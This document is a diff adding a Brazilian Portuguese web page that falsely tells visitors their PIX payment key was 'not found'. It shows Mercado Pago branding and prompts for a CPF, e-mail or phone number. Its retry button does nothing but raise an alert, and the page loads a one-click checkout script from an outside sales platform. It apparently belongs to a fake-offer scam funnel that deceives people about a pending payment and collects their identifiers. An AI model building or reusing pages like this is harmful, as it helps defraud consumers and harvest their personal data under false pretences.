@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Chave Não Encontrada</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;900&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #FFFFFF; /* Fundo branco */
+            color: #000000; /* Letras pretas */
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        #header {
+            background: linear-gradient(to bottom, #FFA500, #8a5a00); /* Alaranjado */
+            color: #FFFFFF; /* Letras brancas */
+            font-weight: bold;
+            font-size: 24px;
+            padding: 30px;
+            margin: 16px;
+            border-radius: 5px;
+        }
+
+        #image {
+            width: 100%;
+            max-width: 150px; /* Ajuste a largura máxima conforme necessário */
+            margin-bottom: 5px;
+            margin-top: 0; /* Remova a margem superior */
+        }
+
+        #icon {
+            width: 200px; /* Ajuste a largura conforme necessário */
+            height: 200px; /* Ajuste a altura conforme necessário */
+            background-size: cover;
+            background: linear-gradient(to bottom, #FFA500, #8a5a00);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px auto; /* Centralizar na tela */
+            font-size: 60px; /* Ajuste o tamanho da fonte conforme necessário */
+            color: #FFFFFF; /* Letras brancas */
+        }
+
+        #message {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+
+        #ins {
+            font-size: 25px;
+            font-family: 'Roboto';
+            font-weight: 500;
+            color: #444444; /* Cor mais pro preto claro */
+            margin-top: 30px;
+        }
+
+        #buttons {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .button {
+            font-size: 17px;
+            font-weight: 750;
+            padding: 10px 15px;
+            border: none;
+            cursor: pointer;
+            color: #000000;
+        }
+
+        .selected {
+            background-color: #bd7b01; /* Laranja escuro */
+            color: #FFFFFF;
+            border-radius: 15px;
+        }
+
+        #chavePixInput {
+            font-family: 'Roboto';
+            font-size: 17px;
+            margin-top: 18px;
+            padding: 18px;
+            border: 1px solid #FFA500; /* Cor da borda */
+            border-radius: 17px; /* Bordas arredondadas */
+            width: 80%; /* Ajuste a largura conforme necessário */
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .message-container {
+            display: none;
+            margin-top: 15px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #444444;
+        }
+
+        .message-container.active {
+            display: block;
+        }
+
+        .pepperBtn {
+            margin-top: 30px;
+            padding: 15px 20px;
+            font-size: 25px;
+            font-weight: bold;
+            background: linear-gradient(to bottom, #FFA500, #bb7900); /* Laranja escuro */
+            color: #FFFFFF;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+        }
+
+        #footer-image {
+            max-width: 300px; /* Largura máxima da imagem no rodapé */
+            margin-top: 50px; /* Espaçamento superior */
+			
+        }
+
+        @media (max-width: 600px) {
+            #icon {
+                width: 100px; /* Ajuste o tamanho conforme necessário para telas menores */
+                height: 100px; /* Ajuste o tamanho conforme necessário para telas menores */
+                font-size: 40px; /* Ajuste o tamanho da fonte para telas menores */
+            }
+        }
+    </style>
+</head>
+<body>
+    <img id="image" src="https://oferta-desconto.online/wp-content/uploads/2023/10/Sem-Titulo-6.png" alt="Imagem">
+    <div id="header">CHAVE NÃO ENCONTRADA</div>
+    <div id="icon">?</div>
+    <div id="message">Clique abaixo para tentar novamente</div>
+    <div id="ins">Escolha sua chave PIX:</div>
+    <div id="buttons">
+        <button class="button" onclick="selectButton(this, 'Por favor, digite seu CPF corretamente apenas com números.', 'cpf')">CPF</button>
+        <button class="button" onclick="selectButton(this, 'Por favor, digite sua chave PIX e-mail.', 'email')">E-mail</button>
+        <button class="button" onclick="selectButton(this, 'Por favor, digite sua chave PIX Telefone.', 'telefone')">Telefone</button>
+    </div>
+
+    <input type="text" id="chavePixInput" placeholder="Digite aqui sua chave pix">
+
+    <div id="cpf-message" class="message-container">Por favor, digite seu CPF corretamente apenas com números.</div>
+    <div id="email-message" class="message-container">Por favor, digite sua chave PIX e-mail.</div>
+    <div id="telefone-message" class="message-container">Por favor, digite sua chave PIX Telefone.</div>
+
+    <button class="pepperBtn" onclick="retry()">Tentar Novamente</button>
+
+    <!-- Imagem no rodapé -->
+    <img id="footer-image" src="https://oferta-desconto.online/wp-content/uploads/2023/11/pagamentos_mercadopago_480x480.webp" alt="Imagem no rodapé">
+
+    <script>
+        function selectButton(button, message, messageType) {
+            // Desselecionar todos os botões
+            var buttons = document.querySelectorAll('.button');
+            buttons.forEach(function(btn) {
+                btn.classList.remove('selected');
+            });
+
+            // Selecionar o botão clicado
+            button.classList.add('selected');
+
+            // Exibir a mensagem correspondente
+            var messageContainers = document.querySelectorAll('.message-container');
+            messageContainers.forEach(function(container) {
+                container.classList.remove('active');
+            });
+
+            var activeMessage = document.getElementById(`${messageType}-message`);
+            activeMessage.classList.add('active');
+
+            // Adicionar formatação à chave PIX, se necessário
+            var chavePixInput = document.getElementById('chavePixInput');
+            switch (messageType) {
+                case 'cpf':
+                    chavePixInput.placeholder = 'Digite aqui seu CPF ';
+                    chavePixInput.value = ''; // Limpar o campo quando mudar a opção
+                    chavePixInput.removeEventListener('input', formatTelefone);
+                    chavePixInput.addEventListener('input', formatCPF);
+                    break;
+                case 'telefone':
+                    chavePixInput.placeholder = 'Digite aqui seu telefone ';
+                    chavePixInput.value = ''; // Limpar o campo quando mudar a opção
+                    chavePixInput.removeEventListener('input', formatCPF);
+                    chavePixInput.addEventListener('input', formatTelefone);
+                    break;
+                default:
+                    chavePixInput.placeholder = 'Digite aqui seu e-mail';
+                    chavePixInput.value = ''; // Limpar o campo quando mudar a opção
+                    chavePixInput.removeEventListener('input', formatCPF);
+                    chavePixInput.removeEventListener('input', formatTelefone);
+            }
+        }
+
+        function formatCPF() {
+            var inputValue = document.getElementById('chavePixInput').value;
+            var formattedValue = inputValue.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            document.getElementById('chavePixInput').value = formattedValue;
+        }
+
+        function formatTelefone() {
+            var inputValue = document.getElementById('chavePixInput').value;
+            var formattedValue = inputValue.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+            document.getElementById('chavePixInput').value = formattedValue;
+        }
+
+        function retry() {
+            alert('Tentando novamente...');
+            // Adicione aqui a lógica para tentar novamente
+        }
+    </script>
+
+	<script src="https://pepper.com.br/oneclick.js"></script>
+</body>
+</html>
